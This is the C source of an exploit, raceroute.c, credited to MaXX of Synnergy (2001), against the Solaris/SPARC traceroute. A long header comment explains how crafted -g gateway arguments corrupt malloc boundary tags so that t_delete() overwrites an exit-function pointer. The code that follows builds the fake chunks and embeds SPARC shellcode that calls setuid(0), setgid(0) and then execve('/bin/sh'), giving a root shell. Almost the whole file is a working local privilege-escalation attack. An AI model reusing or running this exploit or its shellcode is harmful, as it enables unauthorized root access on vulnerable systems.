/*
 * Created: August 18, 2001
 * Updated: September 4, 2001
 *   ______
 *  /   ___\ __ _  ____  ____  ____ ____ ____  __ _
 *  \____  \/  / \/    \/    \/  _ \    \ _  \/  / \
 * /        \___  \  \  \  \  \ ___/  \_/___  \___  \
 * \______  / ____/__/  /__/  /___ \__/ / ____/ ____/
 *        \/\/        \/    \/    \/    \/    \/
 *
 * raceroute.c versus Solaris/Sparc traceroute
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF SYNNERGY
 * Copyright (C) 2001 MaXX <maxx@synnergy.net>
 *
 * Vulnerable versions of traceroute can be tricked into passing a fake
 * chunk of memory to free():
 *
 * $ /v07/p2001/kaempfm1/traceroute-1.4a5/traceroute -g 12 -g 42
 * Bus Error
 *
 * raceroute.c overwrites a function pointer (an entry of the exitfns[]
 * array, described in deadlock.c) with the address of a special
 * shellcode (how this shellcode is constructed and how its address
 * is obtained is also presented in deadlock.c) during a call to the
 * internal t_delete() function.
 *
 * The first gateway provided to traceroute is copied to a 1024 bytes
 * buffer returned by malloc(), but this buffer is immediately freed.
 * The second gateway provided to traceroute is copied after the copy of
 * the first gateway (in the 1024 bytes buffer freed before), and free()
 * is then called in order to free this copy of the second gateway (the
 * pointer passed to free() therefore points to a memory area controlled
 * by the attacker, the very middle of the already freed 1024 bytes
 * buffer).
 *
 * The t_s field of the fake boundary tag processed during this second
 * call to free() therefore corresponds to the last 8 bytes of the copy
 * of the first gateway. In order to store arbitrary bytes within these
 * last bytes of the first gateway, which has to be a valid gateway,
 * raceroute.c uses the trick presented by Dvorak in his Linux/Intel
 * traceroute exploit ("123 \xff\xff\xff\xff" is a valid IP address..
 * the characters after the SPACE character are ignored).
 *
 * The BIT0 bit of this t_s field is set so that this fake chunk
 * of memory is stored by _free_unlocked() in the flist[] array of
 * freed (but not realfreed) chunks. As soon as that fake chunk is
 * processed by realfree() (during one of the calloc() calls performed
 * by traceroute in order to handle the third gateway provided by the
 * exploit), malloc is tricked into believing that the chunk of memory
 * located immediately after the fake chunk is stored within the last
 * bytes of the copy of the first gateway, and this next (fake and
 * carefully crafted) chunk will therefore be processed by t_delete()
 * (as detailed in deadlock.c).
 *
 * Thanks to Dvorak for the "123 \xff\xff\xff\xff" trick (the length
 * of the dummy gateway used by raceroute.c is equal to 3, so that
 * the length of this gateway plus the trailing NUL (second and
 * third gateways) or SPACE (first gateway) character is equal to 4
 * and ensures a 4 bytes alignment), and thanks to Scrippie for the
 * motivation ;)
 *
 * -- MaXX
 */

#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ALIGNMENT 4
#define SHELLCODE_KEY "SHELLCODE"
#define DUMMY_G "123"
#define G_OPTION "-g"
#define DUMMY_ALIGNMENT ""
#define DUMMY_BYTE 0x42
#define CODE_ADDRESS 0xdefaced
#define FUNCTION_POINTER 0xff23824c
#define TRACEROUTE "/v07/p2001/kaempfm1/traceroute-1.4a5/traceroute"

#define WORDSIZE sizeof(WORD)
#define ALIGN 8
typedef union _w_ {
    size_t w_i;
    struct _t_ * w_p;
    char w_a[ ALIGN ];
} WORD;
typedef struct _t_ {
    WORD t_s;
    WORD t_p;
    WORD t_l;
    WORD t_r;
    WORD t_n;
    WORD t_d;
} TREE;
#define SIZE( b ) ( ((b)->t_s).w_i )
#define LEFT( b ) ( ((b)->t_l).w_p )
#define LINKFOR( b ) ( ((b)->t_n).w_p )
#define LINKBAK( b ) ( ((b)->t_p).w_p )
#define SETNOTREE( b ) ( LEFT(b) = (TREE *)(-1) )
#define BIT0 (01)
#define BIT1 (02)

#define SHELLCODE \
    /* setuid( 0 ); */ \
    "\x92\x1a\x40\x09\x90\x12\x40\x09\x82\x10\x20\x17\x91\xd0\x20\x08" \
    /* setgid( 0 ); */ \
    "\x92\x1a\x40\x09\x90\x12\x40\x09\x82\x10\x20\x2e\x91\xd0\x20\x08" \
    /* execve( "/bin/sh", {"/bin/sh", NULL}, NULL ); */ \
    "\x31\x0b\xd8\x9a\xb0\x16\x21\x6e\x33\x0b\xdc\xda\x90\x13\x80\x0e" \
    "\x92\x03\xa0\x08\x94\x1b\x80\x0e\x9c\x03\xa0\x10\xf0\x23\xbf\xf0" \
    "\xf2\x23\xbf\xf4\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b" \
    "\x91\xd0\x20\x08\x90\x10\x20\x2a\x82\x10\x20\x01\x91\xd0\x20\x08" \
    /* call */ \
    "\x7f\xff\xff\xe8\x01nop"
#define CALL_SIZE 8

/* alignment() */
int alignment( void * pointer )
{
    return( (size_t)pointer % ALIGNMENT );
}

/* nul() */
int nul( void * pointer )
{
    int i;

    for ( i = 0; i < sizeof(pointer); i++ ) {
        if ( ((char *)(&pointer))[i] == '\0' ) {
            return( -1 );
        }
    }
    return( 0 );
}

/* main() */
int main( int argc, char * argv[], char * envp[] )
{
    char * p_shellcode;

    p_shellcode = getenv( SHELLCODE_KEY );
    if ( p_shellcode == NULL ) {
        TREE tree;
        WORD t_s;
        char g[ sizeof(DUMMY_G) + sizeof(TREE) + WORDSIZE ];
        char * p_g;
        char * execve_argv[] =
            { NULL, G_OPTION, g, G_OPTION, DUMMY_G, G_OPTION, DUMMY_G, NULL };
        char * execve_envp[] =
            { DUMMY_ALIGNMENT, SHELLCODE_KEY"="SHELLCODE, NULL };

        memset( &tree, DUMMY_BYTE, sizeof(TREE) );
        SIZE( &tree ) = (size_t)( -ALIGNMENT & ~BIT0 );
        LINKBAK( &tree ) = (TREE *)( CODE_ADDRESS );
        SETNOTREE( &tree );
        LINKFOR( &tree ) = (TREE *)( FUNCTION_POINTER - offsetof(TREE,t_p) );

        memset( &t_s, DUMMY_BYTE, WORDSIZE-1 );
        ( (char *)(&t_s) )[ WORDSIZE-1 ] = '\0';
        t_s.w_i = (size_t)( ((-sizeof(TREE) - WORDSIZE) | BIT0) & ~BIT1 );

        p_g = g;
        memcpy( p_g, DUMMY_G" ", sizeof(DUMMY_G) );
        p_g += sizeof(DUMMY_G);
        memcpy( p_g, &tree, sizeof(TREE) );
        p_g += sizeof(TREE);
        memcpy( p_g, &t_s, WORDSIZE );

        execve_argv[ 0 ] = argv[ 0 ];
        execve( execve_argv[0], execve_argv, execve_envp );
        return( -1 );
    } else {
        p_shellcode += strlen( p_shellcode ) - CALL_SIZE;
        if ( alignment(p_shellcode) || nul(p_shellcode) ) {
            size_t size;
            char * p_alignment;

            size = strlen( envp[0] ) + 1;
            p_alignment = malloc( size + 1 );
            if ( p_alignment == NULL ) {
                return( -1 );
            }
            memset( p_alignment, DUMMY_BYTE, size );
            p_alignment[ size ] = '\0';
            envp[ 0 ] = p_alignment;

            execve( argv[0], argv, envp );
            return( -1 );
        } else {
            char * p_linkbak;

            p_linkbak = argv[ 2 ] + sizeof(DUMMY_G) + offsetof(TREE,t_p);
            memcpy( p_linkbak, &p_shellcode, sizeof(p_shellcode) );

            argv[ 0 ] = TRACEROUTE;
            execve( argv[0], argv, envp );
            return( -1 );
        }
    }
    return( -1 );
}

